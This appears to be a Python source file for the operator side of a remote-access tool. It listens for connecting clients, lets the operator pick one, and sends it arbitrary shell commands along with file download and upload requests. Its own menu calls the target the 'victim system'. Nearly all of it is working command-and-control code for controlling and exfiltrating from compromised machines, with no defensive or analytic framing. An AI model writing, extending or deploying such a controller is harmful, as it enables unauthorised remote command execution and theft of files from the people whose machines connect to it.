import socket
import threading
import os.path

from color import TextColor

SERVER_HOST = "127.0.0.1"
SERVER_PORT = 5003

BUFFER_SIZE = 1024
FORMAT = "utf-8"

list_clients = list()
# create a socket object
s = socket.socket()

exit_flag = False
client_i = len(list_clients)

# bind the socket to all IP addresses of this host
s.bind((SERVER_HOST, SERVER_PORT))
s.listen()
print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")


def get_client_system_name(client_socket):
    try:
        client_host, _ = client_socket.getpeername()
        client_system_name = socket.gethostbyaddr(client_host)[0]
        return client_system_name
    except socket.error:
        return "Unknown"


def add_client():
    while not exit_flag:
        try:
            client_socket, client_address = s.accept()
            # print(f"{client_address[0]}:{client_address[1]} Connected!")

            list_clients.append(dict(IP=client_address[0], port=client_address[1], socket=client_socket))
            # just sending a message, for demonstration purposes
            message = "Hello and Welcome".encode()
            client_socket.send(message)
        except KeyboardInterrupt:
            print("Server Stopping...")
            break
        except Exception:
            print("Server Stopping...")
            break


thread = threading.Thread(target=add_client)
thread.start()


def show_clients():
    if len(list_clients) > 0:
        while True:
            global client_i
            for i, c in enumerate(list_clients):
                print(str(i + 1) + "- " + TextColor.cyan("system name:") + get_client_system_name(c["socket"]) +
                      TextColor.cyan(" - IP:") + str(c["IP"]) + TextColor.cyan(" - prot:") + str(c["port"]))

            client_i = input(
                f"Which client you want to access?\nPlease Enter A Number Between {1} and {len(list_clients)}: ")
            if client_i.isdigit():
                if 1 <= int(client_i) <= len(list_clients):
                    client_i = int(client_i) - 1
                    break
                else:
                    print(TextColor.error("Your Input Is Wrong."))
            else:
                print(TextColor.error("Your Input Is Wrong.") +
                      f"\nPlease Enter A Number Between {1} and {len(list_clients)}: ")
    else:
        print("There aren't clients yet...")


def commands():
    # retrieve command results
    results = list_clients[client_i]["socket"].recv(BUFFER_SIZE).decode()
    # print them
    print(results)


def download():
    [_, _, destination] = command.split()
    """ Receiving the filename from the client. """
    filename = list_clients[client_i]["socket"].recv(BUFFER_SIZE).decode(FORMAT)
    print(f"[RECV] Receiving the filename.")
    list_clients[client_i]["socket"].send("name received".encode(FORMAT))

    print(filename)
    file = open(os.path.join(destination, filename), "a")
    """ Receiving the file data from the client. """
    while True:
        print("before")
        data = list_clients[client_i]["socket"].recv(BUFFER_SIZE).decode(FORMAT)
        print("after")
        print(data[-3:])
        if data == "END":
            break
        elif data[-3:] == "END":
            file.write(data[:-3])
            break
        file.write(data)

    print(f"[RECV] Receiving the file data.")
    list_clients[client_i]["socket"].send("File data received".encode(FORMAT))
    """ Closing the file. """
    file.close()


def upload():
    [_, file_path, _] = command.split()
    file_name = os.path.basename(file_path)
    try:
        file = open(file_path, "r+")
        """ Sending the filename to the client. """
        list_clients[client_i]["socket"].send(file_name.encode(FORMAT))
        msg = list_clients[client_i]["socket"].recv(BUFFER_SIZE).decode(FORMAT)
        print(f"[CLIENT]: {msg}")
        """ Sending the file data to the client. """
        sub_data = str()
        while sub_data != "END":
            print("before")
            sub_data = file.read(BUFFER_SIZE)
            print(sub_data)
            print("after")
            if not sub_data:
                sub_data = "END"

            list_clients[client_i]["socket"].sendall(sub_data.encode(FORMAT))

        print("after while")
        msg = list_clients[client_i]["socket"].recv(BUFFER_SIZE).decode(FORMAT)

        print(f"[CLIENT]: {msg}")
        """ Closing the file. """
        file.close()

    except FileNotFoundError as NoFileErr:
        list_clients[client_i]["socket"].send(str(NoFileErr).encode(FORMAT))
    except Exception as err:
        list_clients[client_i]["socket"].send(str(err).encode(FORMAT))


while True:

    if len(list_clients) > 0:
        print()
        print("commands:")
        print("1- show (show all the clients whom connected already)")
        print("2- finish (stop server and close all clients' sockets)")
        print("3- exit (close the current client socket)")
        print("4- any command you'd like to execute on victim system")
        print()
        command = input("Enter the command you wanna execute:")
        if command.lower() == "show":
            show_clients()

        elif command.lower() == "finish":
            exit_flag = True
            break

        else:
            list_clients[client_i]["socket"].send(command.encode())
            if command.lower() == "exit":
                list_clients[client_i]["socket"].close()
                list_clients.pop(client_i)

            elif command.split()[0].lower() == "download":
                download()

            elif command.split()[0].lower() == "upload":
                upload()

            else:
                commands()

# close connection to the clients
for client in list_clients:
    client["socket"].close()

# close server connection
s.close()
